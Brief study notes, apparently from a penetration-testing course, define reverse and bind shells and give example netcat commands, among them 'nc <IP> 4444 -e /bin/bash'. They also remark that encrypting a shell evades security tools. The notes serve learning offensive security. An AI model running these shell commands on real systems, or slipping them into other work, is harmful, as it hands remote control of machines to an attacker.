# Shells and listeners

Shell : CLI that interacts with an operating system, remote shells can run commands from your attacker's host

Reverse shell : when the target inititates a connection with your listener

Example attacker =  nc -lvnp 4444

Example target = nc 10.113.120.146 4444 -e /bin/bash

Blind shell : when the targetopens a listening port and waits for your connection

Example target = nc -lvnp 8080 -e /bin/bash

Example attacker = nc 10.113.147.215 8080

Tools for Remote shells : Netcat, Rlwrap, Socat

Encrypting a shell > bypasses security tools








